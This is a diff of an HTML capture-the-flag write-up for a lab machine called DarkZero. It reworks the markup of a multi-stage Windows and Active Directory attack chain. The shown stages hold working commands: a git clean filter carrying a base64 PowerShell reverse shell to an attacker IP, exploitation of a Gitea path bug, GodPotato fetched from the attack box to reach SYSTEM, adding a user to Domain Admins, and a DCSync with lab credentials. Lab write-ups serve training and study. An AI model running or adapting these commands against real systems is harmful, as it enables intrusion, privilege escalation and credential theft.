-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;SSH in as svc-runner using the planted key&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-10.png&quot; alt=&quot;SSH in as svc-runner using the planted key&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;SSH in as svc-runner using the planted key&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;nc -zv 10.129.59.3 22
-ssh -i /tmp/dzr_key svc-runner@10.129.59.3&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;enumerating svc-runner&amp;#x27;s Kerberos material&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-11.png&quot; alt=&quot;enumerating svc-runner&amp;#x27;s Kerberos material&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;enumerating svc-runner&amp;#x27;s Kerberos material&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;svc-runner@SRV01:~$ ls -la /etc/gitea-runner/
+GITEA='http://gitea.darkzero.ext:3000'
+# ... full script: exploit_gitea_pr_reverse.sh</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>The workflow, once triggered, has the runner drop an SSH key readable by josh and copy the user flag / Kerberos material into a location the runner account (svc-runner) can reach.</p>
+<p><img src="images/darkzero-09.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-10.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>nc -zv 10.129.59.3 22
+ssh -i /tmp/dzr_key svc-runner@10.129.59.3</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-11.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>svc-runner@SRV01:~$ ls -la /etc/gitea-runner/
 svc-runner@SRV01:~$ ls -la /tmp/krb5cc_gitea
 -rw------- 1 svc-runner root 79 May 20 23:33 svc-runner.keytab
 -rw------- 1 svc-runner domain users 1584 Jul 26 04:01 /tmp/krb5cc_gitea
@@ -3880,196 +3269,111 @@ svc-runner@SRV01:~$ ls -la /tmp/krb5cc_gitea
 svc-runner@SRV01:~$ klist -c /tmp/krb5cc_gitea
 Default principal: svc-runner@DARKZERO.EXT
 Valid starting          Expires                 Service principal
-07/26/2026 04:01:23     07/26/2026 14:01:23     krbtgt/DARKZERO.EXT@DARKZERO.EXT&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;user flag as svc-runner&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-12.png&quot; alt=&quot;user flag as svc-runner&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;user flag as svc-runner&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;ssh -i /tmp/dzr_key svc-runner@10.129.59.3 &amp;#x27;id; whoami; cat /home/svc-runner/user.txt&amp;#x27;
+07/26/2026 04:01:23     07/26/2026 14:01:23     krbtgt/DARKZERO.EXT@DARKZERO.EXT</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-12.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>ssh -i /tmp/dzr_key svc-runner@10.129.59.3 'id; whoami; cat /home/svc-runner/user.txt'
 
 uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
-svc-runner&lt;/code&gt;&lt;/pre&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s7&quot; data-num=&quot;07&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;07&lt;/span&gt;
-        &lt;h2&gt;The .git. trick (CI/CD, round 2 — CVE-2026-22547)&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;Gitea&amp;#x27;s template-repository generation is vulnerable to a Windows path-normalization bug: setting a generated repo&amp;#x27;s description to &amp;quot;.git.&amp;quot; causes the expanded template path to collide with the real .git directory once Windows trims the trailing dot, letting a malicious Git config — including a clean filter — get planted inside the generated repository&amp;#x27;s real .git folder.&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;marking the source repo as a Gitea template (PATCH .../repos/.../configproof-template)&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-13.png&quot; alt=&quot;marking the source repo as a Gitea template (PATCH .../repos/.../configproof-template)&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;marking the source repo as a Gitea template (PATCH .../repos/.../configproof-template)&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q curl --negotiate -u : -X PATCH \
-  -H &amp;quot;Content-Type: application/json&amp;quot; \
-  -d &amp;#x27;{&amp;quot;template&amp;quot;:true}&amp;#x27; \
-  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;planting the malicious git clean filter in the template&amp;#x27;s config&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-14.png&quot; alt=&quot;planting the malicious git clean filter in the template&amp;#x27;s config&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;planting the malicious git clean filter in the template&amp;#x27;s config&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;cat &amp;gt; /tmp/malicious_config &amp;lt;&amp;lt;EOF
-[filter &amp;quot;pwn&amp;quot;]
+svc-runner</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+
+<p>07<br>        <br></p><h2 id="sec-7-the-git-trick-ci-cd-round-2-cve-2026-22547">The .git. trick (CI/CD, round 2 — CVE-2026-22547)</h2><p></p>
+<p>Gitea's template-repository generation is vulnerable to a Windows path-normalization bug: setting a generated repo's description to ".git." causes the expanded template path to collide with the real .git directory once Windows trims the trailing dot, letting a malicious Git config — including a clean filter — get planted inside the generated repository's real .git folder.</p>
+<p><img src="images/darkzero-13.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X PATCH \
+  -H "Content-Type: application/json" \
+  -d '{"template":true}' \
+  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-14.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>cat &gt; /tmp/malicious_config &lt;&lt;EOF
+[filter "pwn"]
     clean = powershell.exe -NoProfile -NonInteractive -EncodedCommand $PS_RS_B64
     smudge = cat
     required = true
 EOF
 
-PS_RS=&amp;#x27;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;172.16.20.3&amp;quot;,4444); ...&amp;#x27;
-PS_RS_B64=$(echo -n &amp;quot;$PS_RS&amp;quot; | iconv -t UTF-16LE | base64 -w0)
+PS_RS='$client = New-Object System.Net.Sockets.TCPClient("172.16.20.3",4444); ...'
+PS_RS_B64=$(echo -n "$PS_RS" | iconv -t UTF-16LE | base64 -w0)
 
-FILE_SHA=$(KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q curl --negotiate -u : -s \
-  &amp;quot;http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config?ref=main&amp;quot; \
-  | python3 -c &amp;#x27;import json,sys; print(json.load(sys.stdin)[&amp;quot;sha&amp;quot;])&amp;#x27;)
+FILE_SHA=$(KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -s \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config?ref=main" \
+  | python3 -c 'import json,sys; print(json.load(sys.stdin)["sha"])')
 
 CONTENT=$(base64 -w0 /tmp/malicious_config)
 
-KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q curl --negotiate -u : -X PUT \
-  -H &amp;quot;Content-Type: application/json&amp;quot; \
-  -d &amp;quot;{\&amp;quot;content\&amp;quot;:\&amp;quot;$CONTENT\&amp;quot;,\&amp;quot;branch\&amp;quot;:\&amp;quot;main\&amp;quot;,\&amp;quot;message\&amp;quot;:\&amp;quot;update payload\&amp;quot;,\&amp;quot;sha\&amp;quot;:\&amp;quot;$FILE_SHA\&amp;quot;}&amp;quot; \
-  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;generating a repo from the template, description set to .git.&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-15.png&quot; alt=&quot;generating a repo from the template, description set to .git.&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;generating a repo from the template, description set to .git.&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q curl --negotiate -u : -X POST \
-  -H &amp;quot;Content-Type: application/json&amp;quot; \
-  -d &amp;#x27;{&amp;quot;owner&amp;quot;:&amp;quot;darkzero-ext_josh&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;configproof3&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;.git.&amp;quot;,&amp;quot;private&amp;quot;:true,&amp;quot;git_content&amp;quot;:true}&amp;#x27; \
-  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/generate&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When Gitea&amp;#x27;s on-host runner initializes the generated repo, the planted clean filter fires and the base64-encoded PowerShell callback executes on the Windows host, landing a shell as svc-gitea.&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;HTTP callback confirms the payload fetch (GodPotato.exe served from Kali)&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-16.png&quot; alt=&quot;HTTP callback confirms the payload fetch (GodPotato.exe served from Kali)&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;HTTP callback confirms the payload fetch (GodPotato.exe served from Kali)&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;catching the reverse callback&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-17.png&quot; alt=&quot;catching the reverse callback&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;catching the reverse callback&lt;/figcaption&gt;
-&lt;/figure&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s8&quot; data-num=&quot;08&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;08&lt;/span&gt;
-        &lt;h2&gt;GodPotato → SYSTEM&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;fetching GodPotato on the attack box&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-18.png&quot; alt=&quot;fetching GodPotato on the attack box&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;fetching GodPotato on the attack box&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;transferring GodPotato to the SSH-reachable host&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-19.png&quot; alt=&quot;transferring GodPotato to the SSH-reachable host&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;transferring GodPotato to the SSH-reachable host&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;scp -i /tmp/dzr_key /tmp/GodPotato.exe svc-runner@10.129.59.3:/tmp/GodPotato.exe&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;shell as svc-gitea, pulling GodPotato onto the Windows box&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-20.png&quot; alt=&quot;shell as svc-gitea, pulling GodPotato onto the Windows box&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;shell as svc-gitea, pulling GodPotato onto the Windows box&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;PS C:\...\gitea-configproof34146342436&amp;gt; whoami /all
-PS C:\...\gitea-configproof34146342436&amp;gt; Invoke-WebRequest -UseBasicParsing -Uri &amp;quot;http://172.16.20.3:8000/GodPotato.exe&amp;quot; -OutFile &amp;quot;C:\Windows\Temp\gp.exe&amp;quot; &lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;GodPotato abusing SeImpersonatePrivilege via a DCOM/OXID trick&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-21.png&quot; alt=&quot;GodPotato abusing SeImpersonatePrivilege via a DCOM/OXID trick&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;GodPotato abusing SeImpersonatePrivilege via a DCOM/OXID trick&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;C:\Windows\Temp\gp.exe -cmd &amp;quot;cmd /c whoami&amp;quot;
+KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X PUT \
+  -H "Content-Type: application/json" \
+  -d "{\"content\":\"$CONTENT\",\"branch\":\"main\",\"message\":\"update payload\",\"sha\":\"$FILE_SHA\"}" \
+  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-15.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"owner":"darkzero-ext_josh","name":"configproof3","description":".git.","private":true,"git_content":true}' \
+  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/generate</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>When Gitea's on-host runner initializes the generated repo, the planted clean filter fires and the base64-encoded PowerShell callback executes on the Windows host, landing a shell as svc-gitea.</p>
+<p><img src="images/darkzero-16.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-17.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+
+<p>08<br>        <br></p><h2 id="sec-8-godpotato-system">GodPotato → SYSTEM</h2><p></p>
+<p><img src="images/darkzero-18.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-19.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>scp -i /tmp/dzr_key /tmp/GodPotato.exe svc-runner@10.129.59.3:/tmp/GodPotato.exe</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-20.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>PS C:\...\gitea-configproof34146342436&gt; whoami /all
+PS C:\...\gitea-configproof34146342436&gt; Invoke-WebRequest -UseBasicParsing -Uri "http://172.16.20.3:8000/GodPotato.exe" -OutFile "C:\Windows\Temp\gp.exe"</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-21.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
 ...
 [+] CurrentUser: NT AUTHORITY\NETWORK SERVICE
 [*] PID: 652  Token: 0x748  User: NT AUTHORITY\SYSTEM  ImpersonationLevel: Impersonation
 [+] Find system Token: True
 [+] CurrentUser: NT AUTHORITY\SYSTEM
 
-Set-Content -Encoding ASCII C:\Windows\Temp\addda.cmd &amp;#x27;net group &amp;quot;Domain Admins&amp;quot; josh /add /domain&amp;#x27;
-C:\Windows\Temp\gp.exe -cmd &amp;quot;cmd.exe /c C:\Windows\Temp\addda.cmd&amp;quot;
+Set-Content -Encoding ASCII C:\Windows\Temp\addda.cmd 'net group "Domain Admins" josh /add /domain'
+C:\Windows\Temp\gp.exe -cmd "cmd.exe /c C:\Windows\Temp\addda.cmd"
 ...
-C:\Windows\System32&amp;gt;net group &amp;quot;Domain Admins&amp;quot; josh /add /domain
-The command completed successfully.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;svc-gitea holds SeImpersonatePrivilege. GodPotato abuses it via a DCOM/OXID resolver trick to impersonate NT AUTHORITY\SYSTEM, then adds josh directly to Domain Admins.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s9&quot; data-num=&quot;09&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;09&lt;/span&gt;
-        &lt;h2&gt;DCSync — and the forest-trust wall&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;Confirming access as a domain admin before going further:&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q nxc smb 172.16.20.2 -u josh -p &amp;#x27;Rangers1&amp;#x27; -d darkzero.ext
+C:\Windows\System32&gt;net group "Domain Admins" josh /add /domain
+The command completed successfully.</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>svc-gitea holds SeImpersonatePrivilege. GodPotato abuses it via a DCOM/OXID resolver trick to impersonate NT AUTHORITY\SYSTEM, then adds josh directly to Domain Admins.</p>
+
+<p>09<br>        <br></p><h2 id="sec-9-dcsync-and-the-forest-trust-wall">DCSync — and the forest-trust wall</h2><p></p>
+<p>Confirming access as a domain admin before going further:</p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q nxc smb 172.16.20.2 -u josh -p 'Rangers1' -d darkzero.ext
 
 SMB  172.16.20.2  445  DC02  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None)
-SMB  172.16.20.2  445  DC02  [+] darkzero.ext\josh:Rangers1 (Pwn3d!)&lt;/code&gt;&lt;/pre&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q \
-  impacket-secretsdump &amp;#x27;darkzero.ext/josh:Rangers1@172.16.20.2&amp;#x27; -just-dc&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Domain Admin on darkzero.ext (the internal forest) is complete here — but root.txt lives on DC01.darkzero.htb, the other, HTB-side forest, connected only by a one-way TREAT_AS_EXTERNAL trust. SID history isn&amp;#x27;t honored across that trust by default, so a forged golden ticket for darkzero.ext doesn&amp;#x27;t carry over on its own.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s10&quot; data-num=&quot;10&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;10&lt;/span&gt;
-        &lt;h2&gt;SID-filtering bypass&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;BloodHound&amp;#x27;s own resolver choked over the proxychains tunnel, so impacket-lookupsid and &lt;code&gt;nxc ldap --groups&lt;/code&gt; covered the same ground manually.&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;impacket-secretsdump — full DCSync of darkzero.ext&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-22.png&quot; alt=&quot;impacket-secretsdump — full DCSync of darkzero.ext&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;impacket-secretsdump — full DCSync of darkzero.ext&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;installing BloodHound (for reference, though the tunnel didn&amp;#x27;t cooperate)&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-23.png&quot; alt=&quot;installing BloodHound (for reference, though the tunnel didn&amp;#x27;t cooperate)&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;installing BloodHound (for reference, though the tunnel didn&amp;#x27;t cooperate)&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;pip install bloodhound --break-system-packages&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;SID brute-force against DC02 (darkzero.ext, internal forest)&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-24.png&quot; alt=&quot;SID brute-force against DC02 (darkzero.ext, internal forest)&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;SID brute-force against DC02 (darkzero.ext, internal forest)&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q \
-  impacket-lookupsid &amp;#x27;darkzero.ext/josh:Rangers1@172.16.20.2&amp;#x27; | head -5
+SMB  172.16.20.2  445  DC02  [+] darkzero.ext\josh:Rangers1 (Pwn3d!)</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \
+  impacket-secretsdump 'darkzero.ext/josh:Rangers1@172.16.20.2' -just-dc</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>Domain Admin on darkzero.ext (the internal forest) is complete here — but root.txt lives on DC01.darkzero.htb, the other, HTB-side forest, connected only by a one-way TREAT_AS_EXTERNAL trust. SID history isn't honored across that trust by default, so a forged golden ticket for darkzero.ext doesn't carry over on its own.</p>
 
-Domain SID is: S-1-5-21-2850783758-1231244658-2051857529&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;SID brute-force against DC01 (darkzero.htb, the HTB-side forest)&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-25.png&quot; alt=&quot;SID brute-force against DC01 (darkzero.htb, the HTB-side forest)&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;SID brute-force against DC01 (darkzero.htb, the HTB-side forest)&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q \
-  impacket-lookupsid &amp;#x27;darkzero.ext/josh:Rangers1@172.16.20.1&amp;#x27; 2&amp;gt;&amp;amp;1 | head -10
+<p>10<br>        <br></p><h2 id="sec-10-sid-filtering-bypass">SID-filtering bypass</h2><p></p>
+<p>BloodHound's own resolver choked over the proxychains tunnel, so impacket-lookupsid and <code>nxc ldap --groups</code> covered the same ground manually.</p>
+<p><img src="images/darkzero-22.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
